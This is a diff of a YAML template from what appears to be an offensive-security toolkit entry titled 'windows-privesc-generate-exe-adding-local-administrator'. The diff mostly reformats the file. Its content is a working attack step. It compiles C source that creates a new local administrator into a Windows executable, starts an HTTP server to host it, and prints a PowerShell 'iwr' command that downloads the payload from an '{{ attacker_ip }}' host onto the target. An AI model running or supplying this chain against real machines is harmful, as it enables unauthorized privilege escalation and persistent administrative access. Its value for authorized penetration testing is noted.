@@ -1,25 +1,14 @@
+---
 metadata:
-  filename: windows-privesc-generate-exe-adding-local-administrator.yaml
-  tags:
-  - windows
-  - privesc
-  created: '2025-03-29'
-  author: Unknown
-content: 'mkdir -p packstation/outbound; echo ''(esh source_code/create-new-local-administrator.c)'' > packstation/outbound/create-new-local-administrator.c; x86_64-w64-mingw32-gcc
-  packstation/outbound/create-new-local-administrator.c -o packstation/outbound/create-new-local-administrator.exe;
-  \
+  filename: "windows-privesc-generate-exe-adding-local-administrator.yaml"
+  tags: ["windows", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
 
-  echo ''================================================================''; \
-
-  echo ''                      -----PowerShell-----                      ''; \
-
-  echo ''Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port
-  }}/create-new-local-administrator.exe -Outfile {{ delivery_path_windows }}\create-new-local-administrator.exe'';
-  \
-
-  echo ''================================================================''; \
-
-  python -m {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py {{ delivery_outbound_port
-  }} -d packstation/outbound
-
-  '
+content: |
+  mkdir -p packstation/outbound; echo '{{ include('source_code/create-new-local-administrator.c') }}' > packstation/outbound/create-new-local-administrator.c; x86_64-w64-mingw32-gcc packstation/outbound/create-new-local-administrator.c -o packstation/outbound/create-new-local-administrator.exe; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/create-new-local-administrator.exe -Outfile {{ delivery_path_windows }}\create-new-local-administrator.exe'; \
+  echo '================================================================'; \
+  python -m {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py {{ delivery_outbound_port }} -d packstation/outbound
